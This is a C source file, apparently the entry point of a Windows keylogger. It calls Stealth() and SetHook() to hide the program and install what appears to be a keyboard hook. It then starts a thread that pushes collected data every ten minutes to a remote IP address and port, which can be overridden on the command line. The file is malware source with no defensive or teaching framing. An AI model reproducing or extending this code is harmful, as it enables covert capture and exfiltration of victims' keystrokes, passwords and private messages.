#include "constants.h"
#include "push.h"
#include "keys.h"

int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow)
{
    int nArgs = 0;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLine(), &nArgs);
    _RPT1(_CRT_WARN, __FUNCTION__ ": nArgs = %d\n", nArgs);

    LPCWSTR lpszIpAddress = L"***REMOVED***";
    WORD wPort = 25666;
    DWORD dwPushPeriodMs = 600000; /* 10 minutes */
    
    if (nArgs > 1)
        lpszIpAddress = argv[1];

    if (nArgs > 2)
        wPort = ((WORD)wcstol(argv[2], nullptr, 10));

    if (nArgs > 3)
        dwPushPeriodMs = ((DWORD)wcstol(argv[3], nullptr, 10));

    Stealth();
    SetHook();

    DWORD dwThreadId = 0;
    PUSH_PARAMS push_params = {
        .lpszIpAddress = lpszIpAddress,
        .wPort = wPort,
        .dwPushPeriodMs = dwPushPeriodMs,
    };
    HANDLE hPushThread = CreateThread(NULL, 0, &PushThread, (LPVOID)&push_params, 0, &dwThreadId);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }
}